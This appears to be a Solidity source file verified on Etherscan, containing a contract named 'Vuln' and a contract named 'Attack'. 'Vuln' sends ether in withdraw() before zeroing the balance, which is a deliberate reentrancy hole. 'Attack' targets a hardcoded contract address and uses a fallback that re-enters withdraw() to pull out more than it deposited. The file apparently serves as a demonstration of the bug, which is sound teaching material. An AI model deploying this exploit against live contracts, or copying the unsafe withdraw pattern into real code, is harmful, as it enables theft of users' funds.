/**
 *Submitted for verification at Etherscan.io on 2022-12-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}


contract Attack {
    Vuln vulnContract = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    int count = 0;

    fallback() external payable {
        if (count < 2) {
            count = count + 1;
            vulnContract.withdraw();
        }
    }
    

    function double() external payable {
        vulnContract.deposit.value(msg.value)();
        vulnContract.withdraw();
    }
}